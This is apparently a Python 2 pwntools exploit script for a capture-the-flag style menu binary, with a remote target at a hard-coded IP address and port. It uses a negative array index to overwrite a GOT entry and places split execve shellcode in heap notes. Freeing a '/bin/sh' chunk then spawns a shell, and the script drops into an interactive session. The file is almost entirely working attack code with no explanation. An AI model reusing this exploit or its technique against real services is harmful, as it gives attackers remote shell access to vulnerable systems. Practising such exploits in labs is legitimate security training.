#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 52396)
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def create(index, size, content):
    p.sla('your choice>>', '1')
    p.sla('index:', str(index))
    p.sla('size:', str(size))
    p.sa('content:', content)

def delete(index):
    p.sla('your choice>>', '4')
    p.sla('index:', str(index))

if __name__ == '__main__':
    index = (0x0000000000202018-0x00000000002020A0)//8
    print index
    create(0, 8, '/bin/sh\n')
    create(index, 8, asm('xor eax,eax;xor esi,esi;') + '\xeb\x1a' + '\n')
    create(1, 8, asm('mov al,59;syscall')+'\n')
    #bc(0x555555757280)
    delete(0)
    p.i()
